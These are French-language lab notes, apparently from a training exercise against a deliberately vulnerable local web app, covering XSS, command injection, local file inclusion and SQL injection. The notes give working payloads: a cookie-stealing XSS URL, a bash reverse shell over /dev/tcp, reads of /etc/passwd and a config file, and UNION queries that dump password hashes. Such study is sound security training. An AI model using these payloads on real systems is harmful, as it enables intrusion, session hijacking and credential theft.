# XSS

- Où puis-je injecter du code dans un site Web ?
> Dans l'url, dans un formulaire
- Où ce code sera-t-il interprété (Côté client, serveur) ?
> Coté client
- Quelles sont mes possibilités d’attaques ?
> Exécution d'un script JavaScript côté client, envoie des cookies (authentification, ...)

Afficher une popup :
```html
<script>alert('Pwet Pouet')</script>
```
	
- Comment faire une redirection en JavaScript ?
> Script avec `location.href`

Rediriger vers google :
```html
<script>location.href = "http://www.google.com"</script>
```
	
- Comment récupérer vos cookies en Javascript ?
> `document.cookie`
- Comment envoyer les cookies récupérés vers un site distant contrôlé ?
> Avec un "faux url"
- Comment faire pour monter un site distant (contrôlé) en attente des cookies ? sur Apache ? sur netcat ?
> Netcat pour l'écoute : `nc -l -p 8888`
- Comment utiliser les informations obtenues pour usurper l’identité de l’administrateur ?
> Se faire passer pour l'admin sur le site originel avec f12, stockage et cookie, phpsession
- Cette attaque fonctionne t’elle systématiquement ?
> Non car on ne peut pas toujours récupéré les cookies (httpOnly) et il faut que la personne soit déjà connecté et ça ne marche pas avec un "double facteur"

Afficher les cookies via le formulaire 
```html
<script>alert(document.cookie)</script>
```

Créer un URL qui redirige et récupère les cookies (ici localhost est notre site contrôlé):
> http://localhost/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.location+%3D+%22https%3A%2F%2Flocalhost:8888%2F%27%22+%2B+document.cookie+%2B+%22%27%22%3C%2Fscript%3E#



# Injection de commande

- Comment chainer plusieurs commandes dans un Shell ? `;`
	
Obtenir `/etc/passwd`:
> `;cat ../../../../../../../etc/passwd`

- Que puis-je faire avec netcat ?
> Écouter un port, scan de port transfert de fichier
- Il y a deux versions de netcat, quelle est la différence ?
> GNU et OpenBSD, la différence principale est les arguments de la commande (par exemple, `-l [port]` (BSD) vs `-l -p [port]` (GNU))
- Quelles sont les alternatives pour obtenir un shell ?
> Reverse shell ou shell binding (l'attaquant se connect à l'attaqué)
- Quel langage peut être utilisé ?
> On peut utiliser le shell pour lancer n'importe quel commande, donc possibilité d'utiliser des langages interpretés : bash, perl, python...

Obtenir un shell interactif: 
> Coté attaquant listener : `nc -l -p 4444`

> Coté injection sur le serveur (deux pas obligatoire): `;bash -c "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1"`

# Local file injection

Afficher /etc/passwd (on remplace le include php par le chemin du fichier)
> http://localhost/vulnerabilities/fi/?page=../../../../..//etc/passwd

- Pourquoi ai-je une page blanche ?
> Car c'est un fichier PHP interprété
- Afficher le contenus du fichier de configuration Mysql
> http://localhost:8080/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=../../../../../../../var/www/html/config/config.inc.php
			
1. On appelle la fonction php
2. On utilise filter (appelé à l'URL) et convert en base 64 (sinon interprèté par le navigateur)
3. Puis chemin du fichier
4. (opt) Puis on décode avec par exemple : https://www.base64decode.org/


# Injection MySQL
- Pourquoi ce caractère provoque-t-il une erreur ? Parce qu'on concatène une chaine de caractère
- En quoi ce type de message peut-il nous aider ? C'est un "test" sensible à l'injection SQL, on peut éditer la requête
	
	Le caractère qui génère une erreur et permet une injection -> ' 
	On va remplacer ['id] par ['''] ce qui génère l'erreur
	
- Quels opérateurs SQL nous permettent de deviner le nombre de colonnes ? Union all (permet de concaténer la requête ID avec la requête de l'attaquant)
- A votre avis, pourquoi est-il nécessaire de connaître le nombre de colonnes ? Ça permet de sélectionner quel donnés affiché 
- A votre avis, à quoi ces colonnes visibles pourront-elles servir ? Servirons a affiché les données sensible qui nous intéressent

Trouver le nombre de colonne visible  :
```sql
' || 1 = 1 UNION ALL SELECT 1, 2; #
```
On bourre jusqu’à a arriver au bon nombre pour ne pas qu'on ait d'erreur, # pour passer le reste du code en commentaire
	
Afficher le nom des différentes table et base : 
```sql
' UNION ALL SELECT TABLE_NAME, TABLE_SCHEMA from information_schema.tables; #
```

Trouver les nom de la table user :

- Quelle table contient le nom de toutes les colonnes connues de MySQL ? INFORMATION_SCHEMA.COLUMNS (norme)

Pour trouver le nom des column de la table user :
```sql
' UNION ALL SELECT COLUMN_NAME, '' FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users'#
```

Pour trouver le password des user (hash md5 qui peux se casser sur internet)
```sql
' UNION ALL SELECT first_name, password FROM users #
```
